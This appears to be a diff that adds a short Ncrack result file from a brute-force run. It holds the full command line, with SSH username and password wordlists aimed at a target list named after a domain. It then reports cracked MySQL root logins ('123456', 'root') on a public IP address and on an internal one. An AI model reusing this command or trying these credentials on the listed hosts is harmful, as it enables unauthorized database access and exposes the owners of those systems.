@@ -1,0 +1,5 @@
+# Ncrack 0.7 scan initiated Fri Mar  3 12:21:22 2020 as: /usr/local/bin/ncrack -oN ./tmp/service_brute/service_brute_result -f -v --pairwise -U ./dicts/service_brute_wordlists/ncrack_sshuser.txt -P ./dicts/service_brute_wordlists/ncrack_sshpass.txt -g to=210s -iL ./dicts/www.gfqh.com.cn/
+Discovered credentials on mysql://47.243.106.13:3306 user'root' pass'123456'
+Discovered credentials on mysql://47.243.106.13:3306 user'root' pass'root'
+Discovered credentials on mysql://47.243.106.13:3306 user'root' pass'123456'
+Discovered credentials on mysql://10.0.83.6:2222 'root' 'root'
